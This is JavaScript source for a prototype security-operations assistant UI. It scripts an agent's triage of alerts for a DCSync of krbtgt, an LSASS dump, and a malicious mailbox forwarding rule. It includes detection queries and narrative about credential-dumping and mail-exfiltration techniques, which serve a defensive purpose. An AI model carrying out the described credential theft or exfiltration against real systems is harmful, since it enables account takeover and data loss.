      {time:'08:47',cls:'',txt:'<b>FIN-WS-09</b> issues DRSUAPI replication for <code>krbtgt</code> + 3 accounts'},
      {time:'08:47',cls:'',txt:'Replication authenticated as <code>svc-fin-report</code>'},
      {time:'09:40',cls:'flag',txt:'Replication requests still arriving'},
      {time:'now',cls:'now',txt:'<b>Case opened</b> from alert triage → CASE-2054'},
    ],
    questions:['Has <code>svc-fin-report</code> authenticated anywhere else in the last 24h?','Was a Golden Ticket already forged from the <code>krbtgt</code> hash?','How was <code>svc-fin-report</code> compromised — leaked secret, reuse, or phishing?','Are peer finance workstations showing the same replication behavior?'],
    assessment:'Active DCSync on FIN-WS-09 — credential material including the krbtgt hash is being harvested. Not contained.', assessmentTone:'crit',
    callout:{tone:'crit',icon:'warn',text:`Replication is still active and FIN-WS-09 is online. Isolate the host and rotate krbtgt now — a captured krbtgt hash enables Golden Ticket forgery.`},
    recActions:[ {label:'Isolate FIN-WS-09',icon:'lock',gated:true}, {label:'Rotate the krbtgt password (twice)',icon:'lock',gated:true}, {label:'Hunt svc-fin-report across the domain',icon:'target',gated:false}, {label:'Assign to IR',icon:'users',gated:false} ],
  },
  a3:{ threadId:'day-case-exfil', recordId:'CASE-2055', title:'Mailbox exfiltration rule — r.patel',
    opening:`Case opened from the alert triage. <b>r.patel@corp</b> has a new external <b>forwarding rule</b> — all mail to a personal Gmail with delete-after-forward — created 22 minutes ago from an unfamiliar sign-in geo while the user sat at HQ. That's a business-email-compromise exfil setup (T1114.003) — the same pattern Dark Watch removed on j.reyes overnight (CASE-2043). I've staged <b>disable forwarding</b> and <b>revoke session</b> as the recommended first actions.`,
    situation:`A new <b>inbox forwarding rule</b> on <b>r.patel@corp</b> was created 22 minutes before triage, forwarding all mail to <code>rpatel.mail@gmail.com</code> with delete-after-forward enabled. It was created during a sign-in from <b>Lagos, NG</b> — a geo with no prior history for this user — while <code>r.patel</code> was <b>badged into HQ</b>. MFA was satisfied, but via token replay with no fresh prompt, consistent with session-cookie theft from this week's phishing wave (CASE-2049) — the same pattern Dark Watch removed on j.reyes overnight (CASE-2043). The combination is textbook <b>business-email-compromise</b> exfiltration (T1114.003).`,
    evidence:[
      {id:'e-rule', t:'External forwarding rule → personal Gmail', src:'Discover · New-InboxRule', icon:'db', why:'All mail forwarded externally, delete-after-forward on', snap:'Rule → rpatel.mail@gmail.com, created 22m ago', live:true},
      {id:'e-geo', t:'Sign-in from an unfamiliar geo (Lagos, NG)', src:'Discover · sign-in logs', icon:'network', why:'No prior sign-in history from this country', snap:'Successful sign-in 22m ago, MFA via token replay', live:true},
      {id:'e-pto', t:'User badged into HQ this morning', src:'Entities · badge logs', icon:'user', why:'Physically on-site while the sign-in came from Lagos', snap:'r.patel: badge-in 08:12 · HQ floor 3', live:false},
      {id:'e-phish', t:`Linked to this week's phishing wave`, src:'Cases · related', icon:'clip', why:'Token replay matches the stolen-cookie pattern', snap:'Session cookie likely captured via a lookalike domain', live:false},
    ],
    timeline:[
      {time:'09:18',cls:'',txt:'Sign-in for <code>r.patel@corp</code> from <b>Lagos, NG</b> (MFA via token replay)'},
      {time:'09:19',cls:'flag',txt:'New external <b>forwarding rule</b> created → personal Gmail'},
      {time:'now',cls:'now',txt:'<b>Case opened</b> from alert triage → CASE-2055'},
    ],
    questions:['What did the rule already forward before we caught it?','Are there other new rules or delegate grants on this mailbox?','Which lookalike domain captured the session cookie?','Are other Finance mailboxes showing the same pattern?'],
    assessment:'Business-email-compromise on r.patel@corp — an external exfil rule created from a stolen session. Not contained.', assessmentTone:'warn',
    callout:{tone:'warn',icon:'warn',text:`The forwarding rule is live and mail may be leaving now. Disable the rule and revoke the session before reviewing sent items.`},
    recActions:[ {label:'Disable the forwarding rule',icon:'lock',gated:true}, {label:'Revoke r.patel active sessions',icon:'lock',gated:true}, {label:'Review sent / deleted items',icon:'doc',gated:false}, {label:'Assign to IR',icon:'users',gated:false} ],
  },
};
function triageThread(){ return state.threads['day-triage']; }
function startTriage(){
  const id='day-triage';
  state.threads[id]={ id, mode:'dayshift', type:'chat', title:'Critical alerts — triage', messages:[], suggestions:[], status:null, severity:null, owner:'you', assignees:[], mentions:[], evidence:[], timeline:[], actions:[], narrative:'', recordId:null, _remaining:6, _done:{}, _cases:[] };
  state.activeId=id; state.navView='chats'; state.inspectorOpen=false;
  state.threads[id].messages.push({role:'user',text:'Show critical alerts from the last hour'});
  renderAll();
  thinking('Pulling critical alerts, last 60 min…', ()=>{
    pushMsg({role:'agent',tool:{ icon:'alert',label:'Alerts · severity ≥ high, last 60m',
      query:'kibana.alert.severity:("critical" OR "high")\nAND @timestamp >= now-60m   sort: risk desc',
      result:`<div class="res-stat">
        <div class="stat"><div class="v red">6</div><div class="k">alerts</div></div>
        <div class="stat"><div class="v amber">2</div><div class="k">likely real</div></div>
        <div class="stat"><div class="v">3</div><div class="k">benign / contained</div></div>
        <div class="stat"><div class="v">1</div><div class="k">needs a call</div></div></div>`}});
    pushMsg({role:'agent',name:false,tqueue:true,prose:`<b>6 high-priority alerts this hour — 3 critical.</b> Two look like genuine threats, three are sanctioned changes or already contained, and one needs a call. Want to walk them top-down, or jump straight to the highest risk?`});
    setSuggestions([
      {label:'Start with the highest risk',icon:'target',fn:()=>triageAlert('a1')},
      {label:'Walk them top-down',icon:'list',fn:()=>triageAlert('a1')},
      {label:'Show the two real threats',icon:'alert',fn:()=>triageAlert('a1')},
    ]);
  }, 950);
}
function triageAlert(id){
  if(id==='a1') return tA1();
  if(id==='a2') return tA2();
  if(id==='a3') return tA3();
  return triageBatchReview(); // a4/a5/a6 are handled together
}
function setA1Chips(){ setSuggestions([ {label:'Open a case',icon:'doc',fn:()=>triageOpenCase('a1')}, {label:'Is the replication still active?',icon:'refresh',fn:()=>triageProbe('a1')} ]); }
function setA3Chips(){ setSuggestions([ {label:'Open a case',icon:'doc',fn:()=>triageOpenCase('a3')}, {label:'Was MFA used on that sign-in?',icon:'lock',fn:()=>triageProbe('a3')} ]); }
function tA1(){
  clearSuggestions(); pushMsg({role:'user',text:'Start with the highest-risk one.'});
  thinking('Reading the replication events on FIN-WS-09…',()=>{
    pushMsg({role:'agent',tool:{icon:'db',label:'Discover · directory-service replication',
      query:'event.action:"Directory Service Replication"\nAND host.name:"FIN-WS-09"   window 60m',
      result:`<table class="res"><tr><th>Time</th><th>Object replicated</th><th>By</th></tr>
        <tr><td class="mono">08:47:11</td><td class="mono" style="color:var(--red-d)">krbtgt</td><td class="mono">svc-fin-report</td></tr>
        <tr><td class="mono">08:47:11</td><td class="mono">Administrator</td><td class="mono">svc-fin-report</td></tr>
        <tr><td class="mono">08:47:12</td><td class="mono">svc-sql-admin</td><td class="mono">svc-fin-report</td></tr>
        <tr><td class="mono">08:47:12</td><td class="mono">bkp-admin</td><td class="mono">svc-fin-report</td></tr></table>`}});
    pushMsg({role:'agent',name:false,prose:`This is the real one. <b>FIN-WS-09</b> — a finance workstation — issued a directory-replication (DRSUAPI) request for <code>krbtgt</code> and three privileged accounts, under <code>svc-fin-report</code>. Workstations never replicate; that's a domain-controller operation. This is textbook <b>DCSync</b> (T1003.006) — whoever holds <code>svc-fin-report</code> is pulling credential material to forge tickets. I'd open a case and isolate FIN-WS-09 now.`});
    setA1Chips();
  },950);
}
function tA2(){
  clearSuggestions(); pushMsg({role:'user',text:`Next — the LSASS one on HR-WS-14.`});
  thinking('Cross-referencing the LSASS access against change tickets…',()=>{
    pushMsg({role:'agent',tool:{icon:'shield',label:'Endpoint · process access ⋈ change tickets',
      query:'process.name:"procdump64.exe" AND target:"lsass.exe"\nhost:"HR-WS-14"   → join change_tickets',
      result:`<div class="res-line ok">${ic('check',13)} Matches CHG-4471 — "Capture LSASS dump for vendor support" · owner admin.kpatel · window 08:30–10:00 · approved</div>`}});
    pushMsg({role:'agent',name:false,prose:`This one's benign. <code>procdump</code> hit LSASS on <b>HR-WS-14</b>, but it maps cleanly to change <b>CHG-4471</b> — a sanctioned crash-dump for a vendor support case, run by the assigned engineer (<code>admin.kpatel</code>) inside the approved window. No follow-on access, no exfil. I'd dismiss it and link the change so it won't re-alert.`});
    setSuggestions([ {label:'Dismiss — sanctioned change',icon:'check',fn:()=>triageDismiss('a2')}, {label:'Show CHG-4471',icon:'doc',fn:()=>toast('info','CHG-4471','Sanctioned LSASS crash-dump · approved · owner admin.kpatel.')} ]);
  },850);
}
function tA3(){
  clearSuggestions(); pushMsg({role:'user',text:`Next — the forwarding rule on r.patel.`});
  thinking(`Pulling the rule, the sign-in, and the badge logs…`,()=>{
    pushMsg({role:'agent',tool:{icon:'db',label:'Discover · mailbox rule + sign-in',
      query:'event.action:"New-InboxRule" AND user:"r.patel@corp"\nforward_to:external   window 24h',
      result:`<div class="res-line crit">${ic('warn',13)} Rule forwards all mail → rpatel.mail@gmail.com · delete-after-forward = on</div>
        <table class="res" style="margin-top:8px"><tr><th>Signal</th><th>Value</th></tr>
        <tr><td>Rule created</td><td class="mono">22 min ago</td></tr>
        <tr><td>Sign-in geo</td><td class="mono" style="color:var(--red-d)">Lagos, NG (unfamiliar)</td></tr>
        <tr><td>User status</td><td class="mono">badged into HQ 08:12</td></tr></table>`}});
    pushMsg({role:'agent',name:false,prose:`Second real one. A new external <b>forwarding rule</b> on <b>r.patel@corp</b> was created 22 minutes ago — all mail to a personal Gmail with delete-after-forward on — from an <b>unfamiliar sign-in geo</b>, while the user was <b>badged into HQ</b>. Same pattern Dark Watch removed on j.reyes overnight (CASE-2043). I'd open a case and kill the rule.`});
    setA3Chips();
  },950);
}
function triageProbe(id){
  clearSuggestions();
  const ans={
    a1:{u:'Is the replication still active?',a:`Yes — the most recent request was <b>38 seconds ago</b>. The harvest is ongoing, which is another reason to isolate FIN-WS-09 immediately.`},
    a3:{u:'Was MFA used on that sign-in?',a:`MFA was satisfied — but via token replay, with no fresh prompt. That's consistent with a stolen session cookie from this week's phishing wave (CASE-2049), so the session should be revoked when we open the case.`},
  }[id];
  pushMsg({role:'user',text:ans.u});
  pushMsg({role:'agent',name:false,prose:ans.a});
  if(id==='a1') setA1Chips(); else setA3Chips();
}
function seedTriageCase(a){
  const meta=TRIAGE_CASE[a.id];
  const t={ id:meta.threadId, mode:'dayshift', type:'case', recordId:meta.recordId, title:meta.title,
    status:'open', severity:a.sev, owner:'you', assignees:[], mentions:[], actions:[], messages:[], suggestions:[],
    situation:meta.situation, narrative:meta.situation, evidence:meta.evidence, timeline:meta.timeline, mitre:[a.mitre],
    questions:meta.questions, assessment:meta.assessment, assessmentTone:meta.assessmentTone, callout:meta.callout, recActions:meta.recActions, pinned:false, hypotheses:[] };
  t.messages.push({role:'system',evt:'case',text:'Case opened from alert triage',id:meta.recordId});
  t.messages.push({role:'agent',prose:meta.opening});
  state.threads[meta.threadId]=t;
  initBrief(t); t.brief.versions.push({v:1,ts:Date.now(),label:'Case opened',html:buildBrief(t)});
  renderNav();
  return {threadId:meta.threadId, recordId:meta.recordId, title:meta.title, sev:a.sev};
}
function triageOpenCase(id){
  clearSuggestions(); pushMsg({role:'user',text:'Open a case.'});
  thinking('Assembling the case — evidence, host, account…',()=>{
    const a=TRIAGE_ALERTS.find(x=>x.id===id); const c=seedTriageCase(a);
    const t=triageThread(); t._done[id]='case'; t._remaining=Math.max(0,t._remaining-1); t._cases.push(c);
    const staged = id==='a1' ? `host isolation as the recommended first action` : `'disable forwarding' and 'revoke session' as gated actions`;
    pushMsg({role:'agent',name:false,prose:`Done — <b>${c.recordId}</b> is open, with the evidence, host and account attached. I've staged ${staged} inside it. <b>${t._remaining} left.</b>`, tcase:c});
    triageAdvanceChips(id);
  },1000);
}
function triageDismiss(id){
  clearSuggestions(); pushMsg({role:'user',text:'Dismiss it.'});
  const t=triageThread(); t._done[id]='dismiss'; t._remaining=Math.max(0,t._remaining-1);
  pushMsg({role:'agent',name:false,prose:`Dismissed and linked to <b>CHG-4471</b> so it won't re-alert for this change. <b>${t._remaining} left.</b>`});
  triageAdvanceChips(id);
}
function triageAdvanceChips(fromId){
  const t=triageThread(); const nx=TRIAGE_NEXT[fromId];
  if(nx==='batch'){
    setSuggestions([ {label:`Clear the remaining ${t._remaining}`,icon:'check',fn:()=>triageBatch()}, {label:`What's left?`,icon:'list',fn:()=>triageBatchReview()} ]);
  } else {
    const na=TRIAGE_ALERTS.find(x=>x.id===nx);
    setSuggestions([ {label:`Next — ${na.host}`,icon:'arrow',fn:()=>triageAlert(nx)}, {label:`What's left?`,icon:'list',fn:()=>triageBatchReview()} ]);
  }
}
function triageBatchReview(){
  clearSuggestions(); pushMsg({role:'user',text:`What's left?`});
  thinking('Pulling the remaining three…',()=>{
    pushMsg({role:'agent',name:false,prose:`Three left, and none need a case:<br>• <b>SALES-WS-07</b> — Defender toggled inside SCCM patch window <b>CHG-4460</b>. Sanctioned.<br>• <b>DEV-WS-31</b> — beaconing to a low-rep domain, but it resolves to a <b>newly-onboarded SaaS analytics vendor</b> finance approved last week. Low-rep because it's new, not hostile.<br>• <b>2 Finance users</b> — phishing link, creds entered, but the IdP <b>already force-reset</b> both and there were <b>no MFA approvals</b>. Auto-contained.<br>I'd dismiss the first, snooze the dev beacon 24h on a watchlist, and resolve the phishing one. Clear all three?`});
    setSuggestions([ {label:'Clear all three',icon:'check',fn:()=>triageBatch()} ]);
  },950);
}
function triageBatch(){
  clearSuggestions(); pushMsg({role:'user',text:'Clear all three.'});
  const t=triageThread(); t._done.a4='dismiss'; t._done.a5='watch'; t._done.a6='resolve'; t._remaining=0;
  pushMsg({role:'agent',name:false,prose:`Done. The phishing creds were already rotated by the IdP — marked <b>resolved</b>. The Defender event is linked to <b>CHG-4460</b> and dismissed. The dev beacon is <b>suppressed for 24h</b> and the domain is on a watchlist for review. <b>Queue's empty.</b>`});
  triageWrap();
}
function triageWrap(){
  setTimeout(()=>{ pushMsg({role:'agent',name:false,trecap:true});
    const t=triageThread(); const chips=(t._cases||[]).map(c=>({label:`Open ${c.recordId}`,icon:'doc',fn:()=>App.openThread(c.threadId)}));
    chips.push({label:'Back to the Brief',icon:'sparkle',fn:()=>App.setNavView('brief')});
    setSuggestions(chips);
  },650);
}
function triageTable(){
  const rows=TRIAGE_ALERTS.map(a=>`<tr class="tq-row" onclick="App.triageAlert('${a.id}')">
    <td><span class="sev ${sevClass(a.sev)}">${a.sev}</span></td>
    <td class="tq-rule"><div class="tq-rname">${a.rule}</div><div class="tq-line">${a.line}</div></td>
    <td class="tq-host mono">${a.host}</td>
    <td><span class="tq-verdict v-${a.verdict}">${a.vlabel}</span></td></tr>`).join('');
  return `<div class="tq"><table class="tq-tbl"><thead><tr><th>Sev</th><th>Alert</th><th>Entity</th><th>First read</th></tr></thead><tbody>${rows}</tbody></table></div>`;
}
function caseCreatedCard(c){
  return `<div class="ccard" onclick="App.openThread('${c.threadId}')" title="Open ${c.recordId}">
    <span class="cc-ic">${ic('doc',16)}</span>
    <div class="cc-mid">
      <div class="cc-top"><span class="cc-flag">${ic('check',11)} Case created</span><span class="cc-id mono">${c.recordId}</span><span class="sev ${sevClass(c.sev)}">${c.sev}</span></div>
      <div class="cc-title">${c.title}</div>
    </div>
    <span class="cc-go">Open ${ic('arrow',14)}</span>
  </div>`;
}
function triageRecap(){
  const t=triageThread(); const done=t._done||{}; const cases=(t._cases||[]);
  const counts={dismiss:0,watch:0,resolve:0}; Object.values(done).forEach(v=>{ if(counts[v]!=null) counts[v]++; });
  return `<div class="trecap">
    <div class="tr-h">${ic('check',14)} Triage complete</div>
    <div class="tr-sub">6 alerts triaged in about six minutes</div>
    <div class="tr-stats">
      <div class="tr-stat"><div class="trv">${cases.length}</div><div class="trk">cases opened</div></div>
      <div class="tr-stat"><div class="trv">${counts.dismiss}</div><div class="trk">dismissed</div></div>
      <div class="tr-stat"><div class="trv">${counts.resolve}</div><div class="trk">contained</div></div>
      <div class="tr-stat"><div class="trv">${counts.watch}</div><div class="trk">watched</div></div>
    </div>
    ${cases.length?`<div class="tr-cases">${cases.map(c=>`<div class="tr-case" onclick="App.openThread('${c.threadId}')"><span class="tc-ic">${ic('doc',13)}</span><span class="tc-id mono">${c.recordId}</span><span class="tc-t">${c.title}</span><span class="sev ${sevClass(c.sev)}">${c.sev}</span><span class="cc-go">${ic('arrow',13)}</span></div>`).join('')}</div>`:''}
  </div>`;
}

function projectsView(){ return `<div class="special-pad"><div class="stub-card"><span class="stub-ic">${ic('folder',30)}</span><h3>Projects</h3><p>Group related investigations, threads and records into a shared workspace — pinned context the agent can reason across. Preview in this prototype.</p></div></div>`; }
function templatesView(){ return `<div class="special-pad"><div class="stub-card"><span class="stub-ic">${ic('doc',30)}</span><h3>Templates</h3><p>Reusable investigation starts — pre-seeded prompts, queries, and record scaffolds for the work you do often. Preview in this prototype.</p></div></div>`; }
function navItem(t,ephemeral=false){
  const m=TYPE_META[t.type];
  const isA=t.id===state.activeId && (state.navView==='chats');
  let sub='';
  if(t.type==='chat'){ sub=`<span class="ni-sub">${ephemeral?'Not yet promoted':''}</span>`; }
  else{
    sub=`<span class="ni-sub">${STATUS_LABEL[t.status]} ${t.recordId?`· <span class="ni-id">${t.recordId}</span>`:''}</span>`;
  }
  const iconColor=(t.status==='resolved') ? 'var(--green)' : ((radarScore(t)>=80) ? 'var(--red)' : ((t.severity && SEV[t.severity]) ? SEV[t.severity].c : ((t.type!=='chat' && STATUS_DOT[t.status]) ? STATUS_DOT[t.status] : m.color)));
  return `<div class="nav-item ${isA?'active':''} ${ephemeral?'ephemeral':''}" onclick="App.openThread('${t.id}')">
    <span class="ni-ic" style="--tc:${iconColor}">${ic(m.icon,14)}</span>
    <span class="ni-body">
      <span class="ni-title">${t.title}</span>
      ${sub}
    </span>
  </div>`;
}

/* ============================================================ SPINE HEADER */
function renderSpine(){
  const t=curThread();const spine=$('#spine');
  const showSec=!(state.nav&&state.nav.showSecondary===false);
  if(t.type==='chat'){
    // lightweight chat header: title + collaborators + invite (no type/status/severity)
    const parts=['you',...(t.assignees||[])].filter((v,i,a)=>a.indexOf(v)===i);
    let avs=''; parts.slice(0,5).forEach((pid,i)=>{ avs+=`<span class="pres ${i%2?'idle':''}">${avatar(pid,'')}</span>`; });
    spine.innerHTML=`<div class="spine-in chat-head">
      ${showSec?'':sidebarToggleBtn()}<h2 class="chat-title" contenteditable="true" spellcheck="false" onfocus="App.titleFocus(event)" onkeydown="App.titleKey(event)" onblur="App.renameChat(event)">${t.title||'New chat'}</h2>
      <span class="avatars chat-parts">${avs}</span>
      <button class="invite-btn" onclick="App.startInvite(event)">${ic('users',13)} Invite</button>
      ${panelToggleBtn()}
    </div>`;
    spine.classList.add('show');
    return;
  }
  const m=TYPE_META[t.type];const sev=SEV[t.severity]||SEV.Low;
  const badgeColor=(t.status==='resolved') ? 'var(--green)' : ((radarScore(t)>=80) ? 'var(--red)' : ((t.severity && SEV[t.severity]) ? SEV[t.severity].c : ((t.type!=='chat' && STATUS_DOT[t.status]) ? STATUS_DOT[t.status] : m.color)));
  let avs='';
  const people=[t.owner,...t.assignees].filter((v,i,a)=>a.indexOf(v)===i);
  people.slice(0,4).forEach((pid,i)=>{ avs+=`<span class="pres ${i%2?'idle':''}">${avatar(pid,'')}</span>`; });
  spine.innerHTML=`<div class="spine-in">
    <div class="spine-row1">
      ${showSec?'':sidebarToggleBtn()}<span class="type-badge" style="background:color-mix(in srgb, ${badgeColor} 14%, transparent);color:${badgeColor}">${ic(m.icon,13)} ${m.label}${t.recordId?` <span style="opacity:.6;font-weight:500">${(t.recordId.split('-')[1]||t.recordId)}</span>`:''}</span>
      <h2>${t.title}</h2>
      <span class="avatars">${avs}</span>
      <button class="invite-btn" onclick="App.startInvite(event)">${ic('users',13)} Invite</button>
      ${panelToggleBtn()}
    </div>
    <div class="spine-row2">
      <span class="chip" style="background:var(--panel);border-color:var(--line);border-radius:999px"><span class="dot" style="background:${STATUS_DOT[t.status]}"></span>${STATUS_LABEL[t.status]}</span>
      <span class="chip sev" style="background:var(--panel);color:var(--ink-2);border-color:var(--line);border-radius:999px"><span style="color:${sev.c};display:inline-flex">${ic('warnfill',13)}</span> ${t.severity}</span>
      ${t.owner==='nightshift'?`<span class="chip" style="background:var(--accent-bg);color:var(--accent-d);border-color:var(--accent-bg)">${ic('sparkle',12)} opened by NightShift</span>`:''}
    </div>
  </div>`;
  spine.classList.add('show');
}

/* ============================================================ MESSAGES */
function renderStream(){
  const wrap=$('#streamIn');const t=curThread();
  wrap.innerHTML='';
  // greeting state for empty day chat
  if(t.type==='chat' && t.messages.length===0){
    wrap.appendChild(el(greetingMsg()));
  }
  t.messages.forEach(msg=>{ const node=renderMsg(msg); if(node) wrap.appendChild(node); });
  scrollBottom();
}
function greetingMsg(){
  const agentName = state.mode==='nightshift'?'NightShift':'NotDaybreak';
  const sub = state.mode==='nightshift'?'observability':'security';
  return `<div class="msg agent">
    <span class="who agent-who">${ic(state.mode==='nightshift'?'moon':'sun',16)}</span>
    <div class="body">
      <div class="agent-name">${agentName} <span class="tag">${sub} · agent</span></div>
      <div class="prose">Ready when you are. I can query your data, pull alerts, and chase a lead — reads run automatically and I show my work. When something's worth keeping, say the word and I'll <b>promote this thread into an official record</b> and assemble the spine for you to review.</div>
    </div>
  </div>`;
}
function renderMsg(m){
  if(m.role==='user') return el(`<div class="msg user"><span class="who" style="background-image:url('avatars/you.jpg');background-size:cover;background-position:center;color:transparent">YU</span><div class="bubble">${m.text}</div></div>`);
  if(m.role==='system') return el(sysEvt(m));
  if(m.gate) return el(approvalSheet(m.gate));
  if(m.resolved) return el(resolvedCard(m.resolved));
  // agent
  const agentName = (m.agent==='nightshift'||state.mode==='nightshift')?'NightShift':'NotDaybreak';
  let inner='';
  if(m.name!==false) inner+=`<div class="agent-name">${agentName} <span class="tag">agent</span></div>`;
  if(m.briefcard) inner+=briefRecapCard(m.briefcard);
  if(m.tqueue) inner+=triageTable();
  if(m.prose) inner+=`<div class="prose">${m.prose}</div>`;
  if(m.tool) inner+=toolCard(m.tool);
  if(m.promote) inner+=promoteCard();
  if(m.proposal) inner+=proposalCard(m.proposal);
  if(m.action) inner+=actionCard(m.action);
  if(m.events) inner+=eventsTable();
  if(m.tcase) inner+=caseCreatedCard(m.tcase);
  if(m.trecap) inner+=triageRecap();
  if(m.cite) inner+=citeTag(m.cite);
  return el(`<div class="msg agent"><span class="who agent-who">${ic(state.mode==='nightshift'?'moon':'sun',16)}</span><div class="body">${inner}</div></div>`);
}
function sysEvt(m){
  const map={case:{c:'var(--t-case)',i:'doc'},investigation:{c:'var(--t-inv)',i:'investigation'},incident:{c:'var(--t-incident)',i:'siren'},
    action:{c:'var(--blue)',i:'bolt'},isolate:{c:'var(--red)',i:'lock'},assign:{c:'var(--green)',i:'users'},join:{c:'var(--green)',i:'users'},rollback:{c:'var(--blue)',i:'rotate'},adopt:{c:'var(--green)',i:'check'},nightopen:{c:'var(--accent)',i:'sparkle'}};
  const e=map[m.evt]||map.action;
  return `<div class="sysevt"><span class="se-ic" style="background:${e.c}">${ic(e.i,12)}</span><span>${m.text} ${m.id?`<span class="seid">${m.id}</span>`:''}</span></div>`;
}

/* ---- tool call card ---- */
function toolCard(tool){
  return `<div class="tool">
    <div class="tool-h"><span class="ti">${ic(tool.icon,14)}</span><span class="tl">${tool.label}</span><span class="auto">${ic('check',11)} auto-run</span></div>
    <div class="tool-q">${highlightQuery(tool.query)}</div>
    <div class="tool-r">${tool.result}</div>
  </div>`;
}

/* ---- PROMOTE picker ---- */
function promoteCard(){
  const types=[
    {k:'case',n:'Case',d:'General investigative record with response actions.',spine:'status · severity · owner · evidence · timeline',full:true},
    {k:'incident',n:'Incident',d:'Coordinated response above a severity threshold.',spine:'+ commander · comms · war room'},
    {k:'investigation',n:'Investigation',d:'Open-ended inquiry around a hypothesis.',spine:'hypothesis · findings · evidence'},
    {k:'hunt',n:'Threat Hunt',d:'Proactive hunt across a defined scope.',spine:'hypothesis · scope · queries · outcome'},
  ];
  let grid='';
  types.forEach(t=>{const m=TYPE_META[t.k];
    grid+=`<button class="ptype ${t.full?'full':''}" onclick="App.promoteTo('${t.k}')">
      <span class="pti" style="background:${m.color}">${ic(m.icon,15)}</span>
      <div class="ptn">${t.n}</div><div class="ptd">${t.d}</div>
      <div class="ptspine">${t.spine}</div>
    </button>`;
  });
  return `<div class="promote">
    <div class="ph"><div class="pt">${ic('arrow',16)} Promote this thread</div>
    <div class="ps">Same thread, now official. Pick a type — the type just sets a different <b>spine</b>, and I'll assemble it from the 3 queries and 6 artifacts we've gathered. Nothing is re-entered.</div></div>
    <div class="promote-grid">${grid}</div>
    <button class="ptype" style="margin:0 13px 13px;text-align:center" onclick="App.promoteTo('custom')"><div class="ptn" style="display:flex;align-items:center;gap:8px;justify-content:center">${ic('layers',15)} Custom — define your own spine</div></button>
  </div>`;
}

/* ---- proposal (assemble record) ---- */
function proposalCard(p){
  const m=TYPE_META[p.type];const tlabel=m.label;
  // evidence preview
  let evp='';
  DAY_EVIDENCE.forEach((e,i)=>{ evp+=`<div class="evrow"><span class="en">${i+1}</span><div class="eb">
    <div class="et">${e.t}</div><div class="ed">${e.why}</div>
    <span class="esrc">${ic('link',11)} ${e.src} <span class="live">· ${ic('refresh',10)} live</span></span></div></div>`; });
  // timeline preview
  let tlp='';
  DAY_TIMELINE.forEach(r=>{ tlp+=`<div class="tl-row ${r.cls}"><span class="tdot"></span><span class="ttime">${r.time}</span><span class="ttxt">${r.txt}</span></div>`; });
  let mit='';DAY_MITRE.forEach(t=>mit+=`<span class="mtag">${t}</span>`);
  return `<div class="proposal">
    <div class="prop-h"><span class="pic" style="background:${m.color}">${ic(m.icon,15)}</span>
      <div><div class="pt">Proposed: new ${tlabel}</div><div class="ps">Assembled from 3 queries · 6 artifacts · this conversation</div></div>
      <span class="ribbon">review</span></div>
    <div class="prop-body">
      <div class="field"><div class="fl">Title</div><div class="fv title">Credential compromise: svc-backup interactive logon → C2 → lateral movement (FIN-WS-04)</div></div>
      <div style="display:flex;gap:18px">
        <div class="field"><div class="fl">Severity</div><div class="minitags"><span class="mtag sev-high">High</span></div></div>
        <div class="field"><div class="fl">Owner</div><div class="fv">You</div></div>
      </div>
      <div class="field"><div class="fl">Evidence <span class="add">+6</span></div><div class="evlist">${evp}</div></div>
      <div class="field"><div class="fl">Timeline <span class="add">+5 events</span></div><div class="tl">${tlp}</div></div>
      <div class="field"><div class="fl">MITRE ATT&CK <span class="add">+5</span></div><div class="minitags">${mit}</div></div>
    </div>
    <div class="prop-actions">
      <button class="btn go" onclick="App.approveRecord('${p.type}')">${ic('check',15)} Approve &amp; create ${tlabel.toLowerCase()}</button>
      <button class="btn ghost" onclick="App.toast('info','Edit mode','Every field is editable before you commit.')">Edit</button>
      <button class="btn ghost" onclick="App.toast('info','Discarded','The thread stays as an ephemeral chat.')">Discard</button>
    </div>
  </div>`;
}

/* ---- action confirmation (consequential) ---- */
function actionCard(a){
  // a: {kind:'isolate'|'disable'|'rollback'|'incident', ...}
  const cfg={
    isolate:{cls:'danger',pic:'lock',title:'Network-isolate host',sub:'FIN-WS-04',btn:'danger',btnLabel:'Confirm isolation',perm:'Senior Analyst — host isolation permitted',allow:true,
      blast:[['host','Isolates <b>FIN-WS-04</b> from the network'],['user','<b>1 active session</b> frozen for forensics'],['network','<b>3 inbound dependencies</b> will lose reachability'],['shield','SOC tooling retains access','ok'],['refresh','<b>Reversible</b> — one click to restore','ok']]},
    disable:{cls:'danger',pic:'userx',title:'Disable account',sub:'svc-backup',btn:'danger',btnLabel:'Confirm disable',perm:'Senior Analyst — identity actions permitted',
      blast:[['userx','Disables <b>svc-backup</b> across the directory'],['db','<b>0 interactive sessions</b> (service account)'],['warn','May interrupt <b>nightly backup jobs</b> on BKP-* hosts'],['refresh','<b>Reversible</b> — re-enable any time','ok']]},
    rollback:{cls:'act',pic:'rotate',title:'Roll back deploy',sub:'checkout-service → v2.8.0',btn:'warn',btnLabel:'Approve rollback',perm:'SRE — deploy rollback permitted',
      blast:[['deploy','Rolls <b>checkout-service</b> back to <b>v2.8.0</b>'],['host','<b>3 pods</b> rolling restart'],['shield','<b>No schema change</b> — data-safe','ok'],['clock','Est. recovery <b>~90s</b>; p99 → ~180ms','ok']]},
    incident:{cls:'act',pic:'siren',title:'Convert Case → Incident',sub:(curThread().recordId||'this record'),btn:'warn',btnLabel:'Convert & open war room',perm:'Senior Analyst — may declare incidents',
      blast:[['siren','Upgrades to <b>Incident</b> with command spine'],['users','Adds <b>commander</b>, <b>comms</b>, and a shared war room'],['bolt','Pages the <b>on-call IR commander</b>'],['refresh','Case history &amp; evidence carry over intact','ok']]},
  }[a.kind];
  let blast='';
  cfg.blast.forEach(b=>{ blast+=`<div class="br"><span class="bi">${ic(b[0],14)}</span><span>${b[1]}</span>${b[2]==='ok'?`<span class="ok">${ic('check',12)} safe</span>`:''}</div>`; });
  const allowRow = cfg.allow?`<div class="allowrow"><span class="cb ${state.allowIsolate?'on':''}" id="allowCb" onclick="App.toggleAllow()">${ic('check',12)}</span><span>Always allow <b>host isolation</b> in this case — stop asking</span></div>`:'';
  return `<div class="proposal ${cfg.cls}">
    <div class="prop-h"><span class="pic" style="background:${cfg.cls==='danger'?'var(--red)':'var(--amber)'}">${ic(cfg.pic,15)}</span>
      <div><div class="pt">${cfg.title}</div><div class="ps mono">${cfg.sub}</div></div>
      <span class="ribbon">action · confirm</span></div>
    <div class="prop-body">
      <div class="field"><div class="fl">Blast radius</div><div class="blast">${blast}</div></div>
      <div class="permline"><span class="pl-ic">${ic('shield',14)}</span> <span><b>You</b> — ${cfg.perm}</span></div>
    </div>
    ${allowRow}
    <div class="prop-actions">
